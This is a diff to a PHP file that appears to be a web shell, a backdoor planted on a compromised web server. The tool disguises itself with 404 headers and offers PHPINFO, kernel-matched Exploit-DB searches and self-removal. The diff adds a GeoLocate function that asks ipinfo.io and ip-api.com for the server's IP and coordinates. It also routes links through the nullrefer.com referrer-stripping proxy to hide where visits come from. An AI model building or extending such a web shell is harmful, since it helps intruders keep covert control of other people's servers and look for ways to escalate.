@@ -295,7 +295,7 @@
 			font-size: 14px;
 			background-color: grey;
 			text-transform: uppercase;
-			margin: 10px;
+			margin: 5px;
 			border: 1px solid #333;
 		}
 
@@ -356,6 +356,7 @@
 		<div class="submenu">
 			<a class="button" href="?info">PHPINFO</a>
 			<a class="button" href="<?=ExploitDB();?>">EXPLOIT-DB</a>
+			<a class="button" href="<?=GeoLocate();?>">GEOLOCATE</a>
 			<a class="button selfremove" href="?selfremove">SELF-REMOVE</a>
 		</div>
 	</div>
@@ -369,7 +370,7 @@
 	}
 
 	// ---- FUNCTIONS ----
-	
+
 	/**
 	 *	Set the 404 most common headers
 	 *	Easter Egg: X-Powered-By
@@ -472,14 +473,30 @@
 	{
 		$kernel = explode(" ", $GLOBALS['INFO']['KERNEL'])[0];
 		$release = explode(".", $GLOBALS['INFO']['RELEASE'])[0];
-		$exploitdb = "http://nullrefer.com/?https://www.exploit-db.com/search?q=";
-		return $exploitdb . $kernel . "+" . $release;
+		$exploitdb = "https://www.exploit-db.com/search?q=";
+		return AnonymousRequest($exploitdb . $kernel . "+" . $release);
+	}
+
+	function GeoLocate()
+	{
+		$ip = file_get_contents("https://ipinfo.io/ip");
+		$coords = file_get_contents("http://ip-api.com/csv/" . trim($ip) . "?fields=lat,lon");
+		$maps = "https://www.google.es/maps/place/";
+		return AnonymousRequest($maps . $coords);
+	}
+
+	function AnonymousRequest($URI)
+	{
+		$proxy = "http://nullrefer.com/?";
+		return $proxy . $URI;
 	}
 
 	// ---- ENTRYPOINT ----
 
 	function Main()
 	{
+		
+
 		session_start();
 	
 		SetHeaders();
